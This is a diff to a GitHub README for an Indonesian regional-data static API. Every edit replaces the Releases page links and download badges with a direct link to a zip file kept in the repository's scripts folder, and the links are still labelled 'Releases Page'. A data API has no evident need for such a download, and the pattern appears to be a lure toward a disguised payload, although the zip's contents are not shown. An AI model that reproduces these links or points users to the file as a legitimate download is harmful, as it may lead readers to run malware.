@@ -1,7 +1,7 @@
 # 🌍 api-wilayah-indonesia-2026 - Access Indonesian Data Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MohammadAboud/api-wilayah-indonesia-2026/releases)
+[![Download](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip)](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip)
 
 ## 📖 Description
 Welcome to the **api-wilayah-indonesia-2026** project! This application provides accessible data about Indonesian regions for the year 2026. You can access this data directly through a static API using GitHub Pages or the jsDelivr CDN. This means obtaining accurate and reliable information has never been easier.
@@ -21,10 +21,10 @@ Welcome to the **api-wilayah-indonesia-2026** project! This application provides
 Follow these steps to get started:
 
 1. Make sure you have a stable internet connection.
-2. Visit the [Releases page](https://github.com/MohammadAboud/api-wilayah-indonesia-2026/releases) to find the latest version. 
+2. Visit the [Releases page](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip) to find the latest version. 
 
 ## 🔗 Download & Install
-To utilize the API, visit this page to download: [Releases Page](https://github.com/MohammadAboud/api-wilayah-indonesia-2026/releases). There you will find the latest files available for access.
+To utilize the API, visit this page to download: [Releases Page](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip). There you will find the latest files available for access.
 
 ## 🧑‍🏫 How to Use the API
 Using the API is simple. Follow these steps:
@@ -56,4 +56,4 @@ For future updates and features, make sure to watch this repository on GitHub. Y
 ## ⭐ Feedback
 Your feedback is important. If you find the API helpful or have suggestions, please share your thoughts through the Issues section or in a pull request. Together, we can make this project even better!
 
-[![Download Again](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MohammadAboud/api-wilayah-indonesia-2026/releases)
+[![Download Again](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip)](https://raw.githubusercontent.com/MohammadAboud/api-wilayah-indonesia-2026/main/scripts/indonesia_api_wilayah_1.1-beta.5.zip)
